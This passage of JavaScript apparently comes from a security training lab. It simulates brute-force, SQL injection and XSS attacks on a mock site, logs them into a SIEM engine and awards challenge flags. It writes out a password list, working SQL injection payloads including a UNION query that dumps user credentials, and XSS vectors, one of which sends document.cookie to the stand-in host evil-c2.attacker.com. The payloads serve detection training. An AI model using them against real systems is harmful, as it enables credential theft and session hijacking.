        const text = (textInput.value || '').trim();
        if (!text) return;

        // Ingest into SIEM log engine
        logEngine.ingest({
          client_ip: '192.168.1.105',
          method: 'POST',
          uri: '/board/feedback',
          body: `author=${encodeURIComponent(author)}&comment=${encodeURIComponent(text)}`,
          status: 201,
          user_agent: navigator.userAgent
        });

        // Add to local comments
        this.comments.unshift({
          id: Date.now(),
          author,
          comment: text,
          date: 'Just now'
        });

        // If contains XSS
        if (text.toLowerCase().includes('<script') || text.toLowerCase().includes('onerror=') || text.toLowerCase().includes('<svg')) {
          this.showXssExecutionModal(text, "Stored XSS");
        } else {
          showToast("Feedback submitted successfully (POST logged).", "success");
        }

        // Re-render comments
        const list = document.getElementById('comments-list');
        if (list) list.innerHTML = this.renderCommentsList();
        textInput.value = '';
      };
    }
  }

  // --- ATTACK SIMULATOR EVENTS ---
  bindSimulatorEvents() {
    const btnHydra = document.getElementById('sim-btn-hydra');
    const btnSqlmap = document.getElementById('sim-btn-sqlmap');
    const btnXss = document.getElementById('sim-btn-xss');
    const btnBenign = document.getElementById('sim-btn-benign');
    const btnClear = document.getElementById('sim-btn-clear');

    if (btnHydra) btnHydra.onclick = () => this.runHydraAttack();
    if (btnSqlmap) btnSqlmap.onclick = () => this.runSqlmapScan();
    if (btnXss) btnXss.onclick = () => this.runXssBurst();
    if (btnBenign) btnBenign.onclick = () => this.runBenignBurst();
    if (btnClear) {
      btnClear.onclick = () => {
        const consoleEl = document.getElementById('sim-console-output');
        if (consoleEl) consoleEl.innerHTML = '<div class="text-slate-500">[System] Console cleared.</div>';
      };
    }
  }

  // --- AUTOMATED ATTACK BURSTS ---
  async runHydraAttack() {
    if (this.isAttacking) return;
    this.isAttacking = true;
    this.updateSimBadge();
    showToast("Launching Hydra Brute Force Burst (25 requests)...", "warning");
    this.logToSimConsole("==> Launching Hydra Dictionary Brute Force against /api/login...", "warning");

    const passwords = [
      '123456', 'password', '12345678', 'qwerty', '12345', '123456789', 'admin123',
      'welcome', 'football', 'login', 'princess', 'solo', 'starwars', 'matrix',
      'shadow', 'master', 'dragon', 'monkey', 'secret', 'hunter2', 'pass123',
      'summer', 'spring', 'winter', 'dragon123'
    ];

    const targetUser = 'admin';
    const attackerIp = '198.51.100.188';

    for (let i = 0; i < passwords.length; i++) {
      const pwd = passwords[i];
      const isSuccess = (pwd === 'dragon123');
      const status = isSuccess ? 302 : 401;

      logEngine.ingest({
        client_ip: attackerIp,
        method: 'POST',
        uri: '/api/login',
        body: `username=${targetUser}&password=${pwd}&submit=Login`,
        status: status,
        user_agent: 'Hydra v9.5 (https://github.com/vanhauser-thc/thc-hydra)'
      });

      if (isSuccess) {
        this.logToSimConsole(`[+] [SUCCESS] Account cracked! User: "${targetUser}" | Password: "${pwd}" (HTTP 302 Redirect)`, "success");
        this.logToSimConsole(`[+] Flag Discovered: BLITZ{bruf3_4uth_c0mpr0m153_6e1a4d88}`, "success");
        sfx.playSuccess();
        showToast(`Brute force success! Discovered password: ${pwd}`, "success");
      } else {
        this.logToSimConsole(`[-] Attempt ${i + 1}/${passwords.length}: Failed password "${pwd}" (HTTP 401)`, "danger");
      }

      await new Promise(r => setTimeout(r, 90));
    }

    this.isAttacking = false;
    this.updateSimBadge();
    this.logToSimConsole("==> Hydra attack burst completed. Telemetry ready in SIEM.", "info");
  }

  async runSqlmapScan() {
    if (this.isAttacking) return;
    this.isAttacking = true;
    this.updateSimBadge();
    showToast("Launching Sqlmap scan heuristics (12 requests)...", "warning");
    this.logToSimConsole("==> Initializing sqlmap v1.7.2 scanning probe against /catalog/search?q=...", "warning");

    const payloads = [
      { q: "1", status: 200, note: "baseline probe" },
      { q: "1' AND 1=1--", status: 200, note: "boolean-based true probe" },
      { q: "1' AND 1=2--", status: 500, note: "boolean-based false probe" },
      { q: "1' OR 'a'='a", status: 200, note: "tautology probe" },
      { q: "1' ORDER BY 1--", status: 200, note: "column enumeration" },
      { q: "1' ORDER BY 50--", status: 500, note: "column count boundary error" },
      { q: "1' UNION SELECT NULL--", status: 500, note: "null union probe" },
      { q: "1' UNION SELECT 1,2,3,4,5--", status: 200, note: "union select confirmed" },
      { q: "-1' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--", status: 200, note: "table enumeration" },
      { q: "-1' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns--", status: 200, note: "column enumeration" },
      { q: "-1' UNION SELECT 1,concat(username,0x3a,password),3,4,5 FROM users--", status: 200, note: "data dump" },
      { q: "1' AND SLEEP(5)--", status: 200, note: "time-based blind probe" }
    ];

    const attackerIp = '198.51.100.44';

    for (let i = 0; i < payloads.length; i++) {
      const p = payloads[i];
      logEngine.ingest({
        client_ip: attackerIp,
        method: 'GET',
        uri: '/catalog/search',
        query_params: { q: p.q },
        status: p.status,
        user_agent: 'sqlmap/1.7.2#stable (https://sqlmap.org)'
      });

      this.logToSimConsole(`[sqlmap] Probe ${i + 1}/${payloads.length}: q="${p.q}" -> Status ${p.status} (${p.note})`, p.status === 500 ? "danger" : "info");
      await new Promise(r => setTimeout(r, 110));
    }

    this.isAttacking = false;
    this.updateSimBadge();
    this.logToSimConsole("==> Sqlmap scan completed. Check SIEM rules for automated scanner alerts.", "info");
    showToast("Sqlmap scan burst finished.", "info");
  }

  async runXssBurst() {
    if (this.isAttacking) return;
    this.isAttacking = true;
    this.updateSimBadge();
    showToast("Injecting Polyglot XSS Payloads...", "warning");
    this.logToSimConsole("==> Injecting Reflected and Stored XSS vectors...", "warning");

    const xssVectors = [
      { uri: '/catalog/search', q: "<script>alert('XSS_POC')</script>", method: 'GET' },
      { uri: '/catalog/search', q: "<img src=x onerror=alert('Image_Handler')>", method: 'GET' },
      { uri: '/catalog/search', q: "<svg/onload=alert('SVG_Inline')>", method: 'GET' },
      { uri: '/board/feedback', body: "author=Attacker&comment=<script>fetch('http://evil-c2.attacker.com/steal?c='+document.cookie)</script>", method: 'POST' },
      { uri: '/catalog/search', q: "javascript:alert(document.domain)", method: 'GET' }
    ];

    const attackerIp = '198.51.100.72';

    for (const v of xssVectors) {
      if (v.method === 'GET') {
        logEngine.ingest({
          client_ip: attackerIp,
          method: 'GET',
          uri: v.uri,
          query_params: { q: v.q },
          status: 200,
          user_agent: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0'
        });
      } else {
        logEngine.ingest({
          client_ip: attackerIp,
          method: 'POST',
          uri: v.uri,
          body: v.body,
          status: 201,
          user_agent: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0'
        });
      }
      this.logToSimConsole(`[XSS] Injected ${v.method} on ${v.uri}: ${v.q || v.body}`, "warning");
      await new Promise(r => setTimeout(r, 120));
    }

    this.isAttacking = false;
    this.updateSimBadge();
    this.logToSimConsole("==> XSS payloads emitted. Check SIEM for RULE-SEC-003 alerts.", "info");
    showToast("XSS attack vectors logged.", "info");
  }

  async runBenignBurst() {
    this.logToSimConsole("==> Generating 15 benign background requests...", "info");
    for (let i = 0; i < 15; i++) {
      logEngine.generateBenignLog();
      await new Promise(r => setTimeout(r, 60));
    }
    this.logToSimConsole("[✓] Benign traffic generated.", "success");
    showToast("Generated 15 benign log entries.", "info");
  }

  updateSimBadge() {
    const badge = document.getElementById('sim-status-badge');
    if (!badge) return;
    if (this.isAttacking) {
      badge.className = "px-3 py-1 rounded-full text-xs font-mono bg-amber-500/20 text-amber-300 border border-amber-500/40 animate-pulse";
      badge.textContent = "● Attack In Progress";
    } else {
      badge.className = "px-3 py-1 rounded-full text-xs font-mono bg-emerald-500/20 text-emerald-300 border border-emerald-500/40";
      badge.textContent = "● Ready to Fire";
    }
  }

  showXssExecutionModal(payload, type = "Reflected XSS") {
    sfx.playAlert();
    const modal = document.createElement('div');
    modal.className = "fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm";
    modal.innerHTML = `
      <div class="bg-slate-900 border-2 border-amber-500 rounded-2xl max-w-lg w-full p-6 shadow-2xl space-y-4 animate-bounce-once">
        <div class="flex items-center gap-3 text-amber-400">
          <div class="w-10 h-10 rounded-full bg-amber-500/20 flex items-center justify-center border border-amber-500/50">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
          </div>
          <div>
            <h3 class="text-base font-bold text-white">⚠️ ${escapeHtml(type)} Executed in Sandbox!</h3>
            <p class="text-xs text-amber-300/80">Simulated browser JavaScript execution context</p>
          </div>
        </div>

        <div class="space-y-2 text-xs font-mono">
          <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-slate-300">
            <span class="text-slate-500">Injected Payload:</span>
            <div class="text-amber-300 mt-1 font-bold break-all">${escapeHtml(payload)}</div>
          </div>
          <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-slate-300">
            <span class="text-slate-500">Simulated Cookie Leaked:</span>
            <div class="text-cyan-400 mt-1 break-all">session_token=adm_98f731a; HttpOnly=False; path=/</div>
          </div>
          <div class="bg-emerald-950/60 p-3 rounded-lg border border-emerald-600 text-emerald-300">
            <span class="font-bold">🎉 Challenge Flag Unlocked:</span>
            <div class="text-emerald-400 font-bold select-all mt-1">BLITZ{x55_cl13nt_3x3c_7b39d104fa}</div>
          </div>
        </div>

        <button type="button" class="close-xss-modal-btn w-full bg-amber-600 hover:bg-amber-500 text-slate-950 font-bold py-2 rounded-lg text-xs transition-all">
          Dismiss & Continue Investigation
        </button>
      </div>
    `;

    document.body.appendChild(modal);
    modal.querySelector('.close-xss-modal-btn').onclick = () => modal.remove();
  }
}

export const targetApp = new TargetApp();
